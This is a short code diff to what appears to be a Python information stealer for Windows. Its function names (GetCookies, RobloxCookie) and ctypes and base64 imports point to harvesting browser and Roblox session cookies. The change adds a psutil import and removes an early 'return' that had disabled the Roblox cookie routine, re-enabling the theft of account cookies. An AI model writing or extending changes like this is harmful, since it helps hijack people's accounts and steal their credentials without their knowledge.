@@ -9,6 +9,7 @@ import platform
 import socket
 import getpass
 import platform
+import psutil
 from base64 import b64decode
 from json import loads as json_loads, load
 from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
@@ -720,7 +721,6 @@ def GetCookies(path, arg):
 
 
 def RobloxCookie(path, arg):
-    return
     global roblox_cookie
     pathC = path + arg + "\Cookies"
     tempfold = (
